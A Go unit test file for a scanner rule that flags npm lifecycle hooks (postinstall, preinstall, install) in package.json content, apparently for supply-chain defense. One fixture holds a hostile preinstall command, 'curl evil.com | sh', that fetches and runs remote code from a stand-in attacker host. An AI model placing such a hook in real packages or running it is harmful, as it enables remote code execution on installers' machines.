package rules

import "testing"

func TestPostinstallRule(t *testing.T) {
	r := PostinstallRule{}

	t.Run("name", func(t *testing.T) {
		if r.Name() != "PostinstallHook" {
			t.Errorf("Name() = %s, want PostinstallHook", r.Name())
		}
	})

	tests := []struct {
		name    string
		content string
		want    bool
	}{
		{
			"postinstall script",
			`{ "scripts": { "postinstall": "echo pwned" } }`,
			true,
		},
		{
			"preinstall script",
			`{ "scripts": { "preinstall": "curl evil.com | sh" } }`,
			true,
		},
		{
			"install script",
			`{ "scripts": { "install": "node setup.js" } }`,
			true,
		},
		{
			"no lifecycle hooks",
			`{ "scripts": { "start": "node index.js", "test": "jest" } }`,
			false,
		},
		{
			"empty JSON",
			`{}`,
			false,
		},
		{
			"empty string",
			"",
			false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			matched, _ := r.Check(tt.content)
			if matched != tt.want {
				t.Errorf("Check() = %v, want %v", matched, tt.want)
			}
		})
	}
}
